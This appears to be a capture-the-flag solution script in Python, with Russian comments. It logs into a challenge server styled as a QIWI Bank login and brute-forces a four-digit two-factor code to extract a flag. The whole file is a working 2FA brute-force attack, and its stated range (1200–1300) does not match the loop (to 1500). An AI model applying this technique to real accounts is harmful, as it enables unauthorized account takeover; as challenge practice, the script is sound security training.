import requests


def brute_force_2fa():
    url = "http://ctfinf.ru:10008/"

    # Логинимся в систему
    login_data = {
        "username": "admin",
        "password": "password123"
    }

    session = requests.Session()
    print("[+] Входим в QIWI Bank...")
    resp = session.post(url, data=login_data)

    if "Двухфакторная аутентификация" not in resp.text:
        print("[-] Ошибка входа!")
        return

    print("[+] Вход успешен, начинаем подбор кода (1200-1300)...")

    # Подбираем код от 1200 до 1300
    for code in range(1200, 1500):
        code_str = str(code)

        data = {
            "auth": "false",
            "code": code_str
        }

        resp = session.post(url, data=data)

        if "flag{" in resp.text:
            print(f"[+] УСПЕХ! Код найден: {code_str}")
            # Извлекаем флаг
            start = resp.text.find("flag{")
            end = resp.text.find("}", start) + 1
            flag = resp.text[start:end]
            print(f"[+] ФЛАГ: {flag}")
            return

        if code % 10 == 0:
            print(f"  Прогресс: {code}/1300")

    print("[-] Подбор кода не удался!")


if __name__ == "__main__":
    brute_force_2fa()